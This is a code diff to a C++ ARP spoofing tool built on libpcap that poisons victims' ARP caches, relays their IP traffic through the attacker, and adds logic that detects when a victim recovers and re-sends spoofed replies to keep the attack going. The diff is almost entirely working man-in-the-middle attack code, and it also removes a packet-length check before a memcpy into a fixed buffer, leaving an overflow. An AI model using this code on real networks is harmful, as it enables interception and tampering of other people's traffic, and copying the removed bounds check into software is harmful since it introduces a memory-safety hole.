@@ -110,6 +110,8 @@ void send_arp_spoof(pcap_t* pcap, Mac attacker_mac, Mac sender_mac, Ip sender_ip
     packet.arp_.tmac_ = sender_mac;
     packet.arp_.tip_ = htonl(sender_ip);
 
+    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
+
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
@@ -128,7 +130,34 @@ void relay_packet(pcap_t* pcap, const u_char* packet_data, int packet_len, Mac a
     }
 }
 
-void process_packets(pcap_t* pcap, Mac attacker_mac, vector<pair<Mac, Mac>>& mac_pairs, vector<pair<Ip, Ip>>& ip_pairs) {
+bool check_arp_recovery(const u_char* packet_data, Ip target_ip, Ip sender_ip, Mac sender_mac) {
+    EthArpPacket* arp_packet = (EthArpPacket*)packet_data;
+
+    if (ntohs(arp_packet->eth_.type_) != EthHdr::Arp) {
+        return false;
+    }
+
+    Ip sip = ntohl(arp_packet->arp_.sip_);
+    Ip tip = ntohl(arp_packet->arp_.tip_);
+    Mac smac = arp_packet->arp_.smac_;
+
+    if (ntohs(arp_packet->arp_.op_) == ArpHdr::Request &&
+        sip == sender_ip && tip == target_ip) {
+        printf("Recovery detected: Sender requesting target's real MAC\n");
+        return true;
+    }
+
+    if (ntohs(arp_packet->arp_.op_) == ArpHdr::Reply &&
+        sip == target_ip && tip == sender_ip) {
+        printf("Recovery detected: Target sending real MAC to sender\n");
+        return true;
+    }
+
+    return false;
+}
+
+void process_packets(pcap_t* pcap, Mac attacker_mac, vector<pair<Mac, Mac>>& mac_pairs,
+                     vector<pair<Ip, Ip>>& ip_pairs) {
     struct pcap_pkthdr* header;
     const u_char* packet_data;
     u_char* buffer = new u_char[JUMBO_FRAME_SIZE];
@@ -138,27 +167,38 @@ void process_packets(pcap_t* pcap, Mac attacker_mac, vector<pair<Mac, Mac>>& mac
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
 
-        if (header->len > JUMBO_FRAME_SIZE) {
-            fprintf(stderr, "Packet too large: %d bytes\n", header->len);
-            continue;
-        }
-
         memcpy(buffer, packet_data, header->len);
 
+        EthArpPacket* arp_packet = (EthArpPacket*)buffer;
+        if (ntohs(arp_packet->eth_.type_) == EthHdr::Arp) {
+            for (size_t i = 0; i < ip_pairs.size(); i++) {
+                if (check_arp_recovery(buffer, ip_pairs[i].second, ip_pairs[i].first, mac_pairs[i].first)) {
+                    printf("Reinfecting after recovery detection...\n");
+                    usleep(500000);
+
+                    for(int j = 0; j < 5; j++) {
+                        send_arp_spoof(pcap, attacker_mac, mac_pairs[i].first, ip_pairs[i].first, ip_pairs[i].second);
+                        usleep(100000);
+                    }
+                }
+            }
+        }
+
         struct EthHdr* eth_header = (struct EthHdr*)buffer;
+        if (ntohs(eth_header->type_) == EthHdr::Ip4) {
+            struct IpHdr* ip_header = (struct IpHdr*)(buffer + sizeof(EthHdr));
+            Ip src_ip = ntohl(ip_header->sip_);
 
-        if (ntohs(eth_header->type_) != EthHdr::Ip4) continue;
-
-        struct IpHdr* ip_header = (struct IpHdr*)(buffer + sizeof(EthHdr));
-        Ip src_ip = ntohl(ip_header->sip_);
-
-        for (size_t i = 0; i < ip_pairs.size(); i++) {
-            if (src_ip == ip_pairs[i].first) {
-                relay_packet(pcap, buffer, header->len, attacker_mac, mac_pairs[i].second);
-                break;
+            for (size_t i = 0; i < ip_pairs.size(); i++) {
+                if (src_ip == ip_pairs[i].first) {
+                    relay_packet(pcap, buffer, header->len, attacker_mac, mac_pairs[i].second);
+                    break;
+                }
             }
         }
     }
+
+    delete[] buffer;
 }
 
 int main(int argc, char* argv[]) {
